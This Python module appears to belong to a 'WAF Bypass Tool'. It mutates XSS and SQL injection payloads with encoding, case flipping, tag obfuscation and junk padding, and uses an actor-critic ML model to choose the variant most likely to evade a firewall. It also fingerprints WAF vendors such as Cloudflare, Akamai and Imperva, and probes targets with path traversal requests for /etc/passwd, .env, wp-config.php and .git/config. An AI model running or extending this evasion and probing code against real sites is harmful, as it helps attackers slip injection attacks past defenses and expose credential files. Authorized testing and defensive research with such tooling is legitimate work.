"""
Service implementations for WAF Bypass Tool
Provides concrete implementations of the service interfaces
"""

from typing import List, Optional, Tuple, Any
import requests
import logging
import numpy as np
import random
from interfaces import (
    IMLModel, IPayloadMutator, IInputValidator, IWAFDetector,
    IWAFBypassService, IConfigurationManager, IFeatureExtractor,
    ILogger, IHTTPClient, IErrorHandler
)
from stable_ml import MLConfig
from security import InputValidator, SecureConfig, SecurityConfig
from exceptions import error_handler, ErrorContext
from di_container import get_container
from optimized_features import OptimizedFeatureExtractor
from optimized_ml import OptimizedActorCritic
from optimized_http import OptimizedHTTPClient


class MLModelService(IMLModel):
    """Service wrapper for OptimizedActorCritic"""

    def __init__(self, actor_critic: OptimizedActorCritic, feature_extractor: OptimizedFeatureExtractor):
        self.actor_critic = actor_critic
        self.feature_extractor = feature_extractor

    def choose_action(self, payload: str) -> str:
        """Choose the best action using optimized ML"""
        return self.actor_critic.choose_action(payload)

    def update(self, payload: str, reward: int) -> None:
        """Update the ML model"""
        self.actor_critic.update(payload, reward)

    def get_stats(self) -> dict:
        """Get model statistics"""
        return self.actor_critic.get_stats()


class PayloadMutatorService(IPayloadMutator):
    """Service for payload mutation with validation"""

    def __init__(self, input_validator: IInputValidator, security_config: SecurityConfig):
        self.input_validator = input_validator
        self.security_config = security_config

        # Mutation strategies
        self.mutation_strategies = [
            self.encode_chars,
            self.case_alteration,
            self.inject_noise,
            self.reorder_elements,
            self.url_encode_payload,
            self.base64_encode_payload,
            self.obfuscate_js_payload,
            self.insert_junk_data,
            self.advanced_xss_payload,
            self.advanced_sqli_payload,
        ]

    def mutate(self, payload: str, ml_model: IMLModel) -> str:
        """Mutate payload using ML-guided selection"""
        with ErrorContext(error_handler, "payload_mutation"):
            # Validate input
            is_valid, result = self.input_validator.validate_payload(payload)
            if not is_valid:
                raise ValueError(result)

            payload = result  # Use sanitized payload

            # Generate candidate mutations using different strategies
            candidates = []
            strategies_tried = set()

            # Try up to 8 different strategies (allowing some retries for randomness)
            for _ in range(min(8, len(self.mutation_strategies))):
                available_strategies = [s for s in self.mutation_strategies if id(s) not in strategies_tried]
                if not available_strategies:
                    break
                strategy = random.choice(available_strategies)

                strategies_tried.add(id(strategy))  # Use id to avoid calling same strategy multiple times

                try:
                    mutated = strategy(payload)
                    if (len(mutated) <= self.security_config.max_payload_length and
                        len(mutated) > 0 and
                        mutated != payload):  # Don't include identical payloads
                        candidates.append(mutated)
                except Exception as e:
                    logging.debug(f"Mutation strategy failed: {e}")
                    continue

            # If no valid mutations, return original
            if not candidates:
                return payload

            # ML-guided selection: score each candidate using the ML model
            if hasattr(ml_model, 'actor_critic') and hasattr(ml_model.actor_critic, 'feature_extractor'):
                try:
                    # Get feature extractor from ML model
                    feature_extractor = ml_model.actor_critic.feature_extractor

                    best_mutation = payload
                    best_score = float('-inf')

                    for candidate in candidates:
                        try:
                            # Extract features for this candidate
                            features = feature_extractor.extract_features(candidate).reshape(1, -1)

                            # Use critic to score how good this mutation is expected to be
                            # Critic predicts expected reward for a state
                            if hasattr(ml_model.actor_critic, 'critic') and hasattr(ml_model.actor_critic.critic, 'predict'):
                                score = ml_model.actor_critic.critic.predict(features)[0]
                            else:
                                # Fallback: use simple heuristic if critic not available
                                score = len(set(candidate)) / len(candidate)  # Diversity heuristic

                            if score > best_score:
                                best_score = score
                                best_mutation = candidate

                        except Exception as e:
                            logging.debug(f"ML scoring failed for candidate: {e}")
                            # Use first valid candidate as fallback
                            best_mutation = candidates[0]
                            break

                    logging.debug(f"ML-guided mutation: selected candidate with score {best_score:.3f}")
                    return best_mutation

                except Exception as e:
                    logging.debug(f"ML-guided selection failed, using fallback: {e}")

            # Fallback: use first valid mutation if ML scoring fails
            logging.debug("Using fallback mutation selection")
            return candidates[0] if candidates else payload

    def _get_random_strategies(self, count: int):
        """Get random mutation strategies"""
        import random
        return random.sample(self.mutation_strategies, count)

    # Mutation strategy implementations
    def encode_chars(self, payload: str) -> str:
        return payload.replace('<', '%3C').replace('>', '%3E')

    def case_alteration(self, payload: str) -> str:
        return ''.join([c.lower() if c.isupper() else c.upper() for c in payload])

    def inject_noise(self, payload: str) -> str:
        import random
        noise = ''.join(random.choice([' ', '!', '?', '=', '-', '/']) for _ in range(5))
        mid = len(payload) // 2
        return payload[:mid] + noise + payload[mid:]

    def reorder_elements(self, payload: str) -> str:
        if '<script>' in payload.lower():
            return payload.replace('<script>', '<sCrIpT>').replace('</script>', '</sCrIpT>')
        return payload

    def url_encode_payload(self, payload: str) -> str:
        return requests.utils.quote(payload)

    def base64_encode_payload(self, payload: str) -> str:
        import base64
        return base64.b64encode(payload.encode()).decode()

    def obfuscate_js_payload(self, payload: str) -> str:
        if "<script>" in payload.lower():
            return payload.replace("<script>", "<scr+ipt>").replace("</script>", "</scr+ipt>")
        return payload

    def insert_junk_data(self, payload: str) -> str:
        try:
            content_type = "application/x-www-form-urlencoded"
            size_kb = 1

            if "application/x-www-form-urlencoded" in content_type:
                junk_data = "a=" + "0" * (int(size_kb * 1024) - 2) + "&"
            else:
                junk_data = "a=" + "0" * (int(size_kb * 1024) - 2) + "&"

            import random
            insertion_point = random.randint(0, len(payload))
            return payload[:insertion_point] + junk_data + payload[insertion_point:]
        except Exception:
            return payload

    def advanced_xss_payload(self, payload: str) -> str:
        payloads = [
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
        ]
        import random
        return random.choice(payloads)

    def advanced_sqli_payload(self, payload: str) -> str:
        payloads = [
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' #",
            "1' OR '1'='1' /*",
        ]
        import random
        return random.choice(payloads)


class InputValidatorService(IInputValidator):
    """Service wrapper for InputValidator"""

    def __init__(self, input_validator: InputValidator):
        self.input_validator = input_validator

    def validate_url(self, url: str) -> Tuple[bool, str]:
        return self.input_validator.validate_url(url)

    def validate_payload(self, payload: str) -> Tuple[bool, str]:
        return self.input_validator.validate_payload(payload)

    def validate_file_path(self, file_path: str) -> Tuple[bool, str]:
        return self.input_validator.validate_file_path(file_path)


class WAFDetectorService(IWAFDetector):
    """Service for WAF detection with detailed identification"""

    def __init__(self, http_client: IHTTPClient, input_validator: IInputValidator):
        self.http_client = http_client
        self.input_validator = input_validator

        # WAF signatures and detection patterns
        self.waf_signatures = {
            'Cloudflare': {
                'headers': ['CF-RAY', 'CF-Cache-Status', 'CF-Request-ID'],
                'response_patterns': ['DDoS protection by Cloudflare', 'Checking your browser', 'cf-browser-verification'],
                'server_patterns': ['cloudflare', 'Cloudflare'],
                'confidence': 0.9
            },
            'Akamai': {
                'headers': ['X-Akamai-Transformed', 'X-Akamai-Edgescape', 'Akamai-Origin-Hop'],
                'response_patterns': ['AkamaiGHost', 'Akamai Bot Manager'],
                'server_patterns': ['AkamaiGHost', 'Akamai'],
                'confidence': 0.85
            },
            'Imperva': {
                'headers': ['X-Iinfo', 'X-Iinfo2', 'X-Incap-Sess'],
                'response_patterns': ['Incapsula', 'Blocked by Imperva'],
                'server_patterns': ['Incapsula', 'Imperva'],
                'confidence': 0.8
            },
            'ModSecurity': {
                'response_patterns': ['Mod_Security', 'mod_security', 'OWASP ModSecurity'],
                'server_patterns': ['mod_security', 'ModSecurity'],
                'confidence': 0.7
            },
            'F5 BIG-IP': {
                'headers': ['X-WA-Info', 'X-WA-Application', 'X-Cnection'],
                'response_patterns': ['The requested URL was rejected', 'Request Rejected'],
                'server_patterns': ['BigIP', 'BIG-IP'],
                'confidence': 0.75
            },
            'AWS WAF': {
                'headers': ['x-amzn-RequestId', 'X-Amz-Cf-Id'],
                'response_patterns': ['AWS', 'Forbidden'],
                'confidence': 0.6
            }
        }

    def detect_waf(self, url: str) -> bool:
        """Detect WAF presence with comprehensive testing"""
        with ErrorContext(error_handler, "waf_detection"):
            # Validate URL
            is_valid, result = self.input_validator.validate_url(url)
            if not is_valid:
                raise ValueError(result)

            validated_url = result
            detection_details = self._analyze_waf_signatures(validated_url)

            # If we found specific WAF signatures, return True
            if detection_details['detected_waf'] != 'Unknown':
                return True

            # Fallback to generic detection
            return self._generic_waf_detection(validated_url)

    def detect_waf_detailed(self, url: str) -> dict:
        """Detect WAF with detailed information"""
        with ErrorContext(error_handler, "waf_detection_detailed"):
            # Validate URL
            is_valid, result = self.input_validator.validate_url(url)
            if not is_valid:
                raise ValueError(result)

            validated_url = result
            detection_details = self._analyze_waf_signatures(validated_url)

            # Test for generic WAF presence if no specific signatures found
            if detection_details['detected_waf'] == 'Unknown':
                generic_detected = self._generic_waf_detection(validated_url)
                detection_details['generic_detection'] = generic_detected

            return detection_details

    def _analyze_waf_signatures(self, url: str) -> dict:
        """Analyze response for WAF signatures"""
        detection_result = {
            'detected_waf': 'Unknown',
            'confidence': 0.0,
            'detection_method': 'signature_analysis',
            'evidence': [],
            'headers_found': [],
            'response_patterns': [],
            'server_info': None
        }

        try:
            # Get baseline response
            response = self.http_client.get(url, timeout=10)

            # Check response headers
            response_headers = {k.lower(): v for k, v in response.headers.items()}

            # Check server header
            server_header = response_headers.get('server', '').lower()
            detection_result['server_info'] = response_headers.get('server')

            # Analyze each WAF signature
            for waf_name, signatures in self.waf_signatures.items():
                confidence = 0.0
                evidence = []

                # Check headers
                header_matches = []
                for header in signatures.get('headers', []):
                    if header.lower() in response_headers:
                        header_matches.append(header)
                        confidence += 0.3

                if header_matches:
                    evidence.append(f"Headers: {', '.join(header_matches)}")
                    detection_result['headers_found'].extend(header_matches)

                # Check server patterns
                server_matches = []
                for pattern in signatures.get('server_patterns', []):
                    if pattern.lower() in server_header:
                        server_matches.append(pattern)
                        confidence += 0.4

                if server_matches:
                    evidence.append(f"Server: {', '.join(server_matches)}")

                # Check response content patterns
                content_matches = []
                response_text = response.text.lower()
                for pattern in signatures.get('response_patterns', []):
                    if pattern.lower() in response_text:
                        content_matches.append(pattern)
                        confidence += 0.3

                if content_matches:
                    evidence.append(f"Content: {', '.join(content_matches)}")
                    detection_result['response_patterns'].extend(content_matches)

                # If confidence is high enough and we have evidence
                base_confidence = signatures.get('confidence', 0.5)
                if confidence >= 0.5 and evidence:
                    final_confidence = min(base_confidence + confidence, 1.0)
                    if final_confidence > detection_result['confidence']:
                        detection_result.update({
                            'detected_waf': waf_name,
                            'confidence': final_confidence,
                            'evidence': evidence
                        })

        except Exception as e:
            detection_result['error'] = str(e)

        return detection_result

    def _generic_waf_detection(self, url: str) -> bool:
        """Generic WAF detection using common triggers"""
        # Test paths that commonly trigger WAF
        waf_test_paths = [
            "/.git/config",
            "/.env",
            "/wp-config.php",
            "/admin",
            "/phpinfo.php",
            "/etc/passwd",
            "/var/www/html",
            "/index.php?page=../../../../etc/passwd",
            "/index.php?page=../../../../.env",
            "/index.php?page=../../../../wp-config.php",
        ]

        # Test payloads
        waf_test_payloads = [
            "<script>alert(1)</script>",
            "' OR 1=1 --",
            "UNION SELECT null,null,null",
            "../../../../../../etc/passwd",
            "../../../../../../.env",
            "../../../../../wp-config.php",
            "<?php echo 'test'; ?>",
            "'; DROP TABLE users; --",
            "SELECT * FROM users WHERE '1'='1'",
        ]

        # Test paths
        for path in waf_test_paths:
            try:
                full_url = url.rstrip('/') + path
                response = self.http_client.get(full_url, timeout=10)
                if response.status_code in [403, 406]:
                    return True
            except Exception:
                continue

        # Test payloads
        for payload in waf_test_payloads:
            try:
                validated_payload = self.input_validator.validate_payload(payload)[1]
                response = self.http_client.get(url, params={"q": validated_payload}, timeout=10)
                if response.status_code in [403, 406]:
                    return True
            except Exception:
                continue

        return False


class HTTPClientService(IHTTPClient):
    """Service wrapper for OptimizedHTTPClient"""

    def __init__(self, http_client: OptimizedHTTPClient):
        self.http_client = http_client

    def get(self, url: str, **kwargs) -> requests.Response:
        return self.http_client.get(url, **kwargs)

    def post(self, url: str, **kwargs) -> requests.Response:
        return self.http_client.post(url, **kwargs)


class LoggerService(ILogger):
    """Service wrapper for logging"""

    def __init__(self, name: str = "waf_bypass"):
        self.logger = logging.getLogger(name)

    def debug(self, message: str, **kwargs) -> None:
        self.logger.debug(message, **kwargs)

    def info(self, message: str, **kwargs) -> None:
        self.logger.info(message, **kwargs)

    def warning(self, message: str, **kwargs) -> None:
        self.logger.warning(message, **kwargs)

    def error(self, message: str, **kwargs) -> None:
        self.logger.error(message, **kwargs)

    def critical(self, message: str, **kwargs) -> None:
        self.logger.critical(message, **kwargs)


class ErrorHandlerService(IErrorHandler):
    """Service wrapper for error handler"""

    def handle_exception(self, exception: Exception, context: Optional[dict] = None) -> Optional[Any]:
        return error_handler.handle_exception(exception, context)

    def get_error_stats(self) -> dict:
        return error_handler.get_error_stats()


class FeatureExtractorService(IFeatureExtractor):
    """Service wrapper for feature extraction"""

    def __init__(self, extractor_func):
        self.extractor_func = extractor_func

    def extract_features(self, payload: str) -> np.ndarray:
        return self.extractor_func(payload)
